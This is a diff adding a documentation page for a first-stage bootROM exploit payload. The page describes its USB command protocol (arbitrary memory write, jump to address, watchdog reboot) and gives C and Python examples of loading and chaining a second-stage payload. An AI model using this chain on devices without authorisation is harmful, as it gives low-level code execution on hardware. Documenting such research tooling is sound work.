@@ -1,0 +1,227 @@
+---
+title: 'Stage 1 Payload'
+description: 'First-stage bootROM exploit payload providing memory operations and code execution'
+---
+
+## Overview
+
+Stage 1 is the initial payload executed after the bootROM exploit. It provides a minimal command protocol over USB for memory manipulation and code execution, allowing the attacker to load and execute Stage 2 or other payloads.
+
+**Source:** `brom-payload/stage1.c:14`
+
+## Protocol
+
+### Handshake
+
+After initialization, Stage 1 sends a handshake marker to indicate readiness:
+
+```c
+send_dword(0xA1A2A3A4);
+```
+
+### Command Format
+
+All commands follow this protocol:
+
+1. **Magic value:** `0xf00dd00d` (4 bytes)
+2. **Command code:** (4 bytes)
+3. **Command-specific parameters:** (variable)
+
+If the magic value doesn't match, Stage 1 terminates with a protocol error.
+
+**Implementation:** `brom-payload/stage1.c:26-32`
+
+## Commands
+
+### 0x4000: Write Memory
+
+Writes arbitrary data to a specified memory address.
+
+**Parameters:**
+- `address` (uint32_t): Target memory address
+- `size` (uint32_t): Number of bytes to write
+- `data` (bytes): Raw data to write
+
+**Response:**
+- `0xD0D0D0D0` on success
+- `0xF0F0F0F0` on failure
+
+**Example:**
+```c
+// Write payload to 0x201000
+uint32_t address = 0x201000;
+uint32_t size = 0x8000;
+
+send_dword(0xf00dd00d);  // Magic
+send_dword(0x4000);       // Write command
+send_dword(address);
+send_dword(size);
+send_data(payload_buffer, size);
+
+uint32_t response = recv_dword();
+if (response == 0xD0D0D0D0) {
+    // Success
+}
+```
+
+**Implementation:** `brom-payload/stage1.c:35-49`
+
+<Note>
+This command uses the `recv_data()` function which transfers data over USB. The data is received in 4-byte chunks and written directly to the specified address.
+</Note>
+
+### 0x4001: Jump to Address
+
+Transfers execution to a specified memory address.
+
+**Parameters:**
+- `address` (uint32_t): Target address to jump to
+
+**Response:** None (execution transfers to new code)
+
+**Example:**
+```c
+// Jump to Stage 2 payload at 0x201000
+send_dword(0xf00dd00d);  // Magic
+send_dword(0x4001);       // Jump command
+send_dword(0x201000);     // Address
+
+// Stage 2 now executes
+```
+
+**Implementation:** `brom-payload/stage1.c:50-56`
+
+<Note>
+This is typically used to chain to Stage 2 after loading it into memory with the Write Memory command.
+</Note>
+
+### 0x3000: Reboot Device
+
+Triggers a hardware reboot by manipulating watchdog timer registers.
+
+**Parameters:** None
+
+**Response:** None (device reboots)
+
+**Register Operations:**
+```c
+volatile uint32_t *reg = (volatile uint32_t *)0x10007000;
+reg[8/4] = 0x1971;       // Unlock watchdog
+reg[0/4] = 0x22000014;   // Configure watchdog
+reg[0x14/4] = 0x1209;    // Trigger reset
+```
+
+**Implementation:** `brom-payload/stage1.c:57-67`
+
+### 0x3001: Kick Watchdog
+
+Resets the watchdog timer to prevent automatic reboot.
+
+**Parameters:** None
+
+**Response:** None
+
+**Register Operations:**
+```c
+volatile uint32_t *reg = (volatile uint32_t *)0x10007000;
+reg[8/4] = 0x1971;  // Unlock and kick watchdog
+```
+
+**Implementation:** `brom-payload/stage1.c:68-73`
+
+<Note>
+The watchdog is located at base address `0x10007000`. The unlock key `0x1971` must be written before any watchdog operations.
+</Note>
+
+## Memory Layout
+
+### Watchdog Timer Base
+
+**Address:** `0x10007000`
+
+**Registers:**
+- `+0x00`: Watchdog control register
+- `+0x08`: Watchdog unlock register (write `0x1971` to unlock)
+- `+0x14`: Watchdog reset trigger
+
+## USB Communication
+
+### Functions
+
+Stage 1 uses bootROM USB functions for communication:
+
+```c
+void send_usb_response(int, int, int);
+int send_dword(uint32_t value);
+uint32_t recv_dword();
+int recv_data(uint32_t address, uint32_t size, uint32_t flags);
+```
+
+**Initial Response:** `brom-payload/stage1.c:21`
+```c
+send_usb_response(0, 0, 1);
+```
+
+This prevents USB timeout errors and signals successful payload execution.
+
+## Error Handling
+
+### Protocol Errors
+
+If an invalid magic value is received:
+
+```c
+if (magic != 0xf00dd00d) {
+    print("Protocol error\n");
+    break;
+}
+```
+
+The command loop terminates and enters an infinite loop.
+
+### Invalid Commands
+
+Unrecognized command codes are ignored:
+
+```c
+default:
+    print("Invalid command\n");
+    break;
+```
+
+**Implementation:** `brom-payload/stage1.c:74-77`
+
+## Usage Example
+
+Typical exploit flow:
+
+```python
+# 1. Trigger bootROM exploit and load Stage 1
+exploit.send_payload(stage1_binary)
+
+# 2. Wait for handshake
+handshake = device.read(4)
+assert handshake == b'\xA4\xA3\xA2\xA1'
+
+# 3. Load Stage 2 into memory
+device.write(struct.pack('<II', 0xf00dd00d, 0x4000))  # Magic + Write
+device.write(struct.pack('<II', 0x201000, len(stage2)))
+device.write(stage2)
+
+response = struct.unpack('<I', device.read(4))[0]
+assert response == 0xD0D0D0D0
+
+# 4. Jump to Stage 2
+device.write(struct.pack('<III', 0xf00dd00d, 0x4001, 0x201000))
+```
+
+## Limitations
+
+- **No MMC/eMMC access**: Stage 1 cannot read or write flash storage
+- **Limited memory**: Runs entirely in SRAM
+- **No interrupts**: Operates in a simple polling loop
+- **Single-threaded**: Cannot handle concurrent operations
+
+<Note>
+Stage 1 is designed to be minimal and reliable. For advanced operations like flash access, chain to Stage 2.
+</Note>
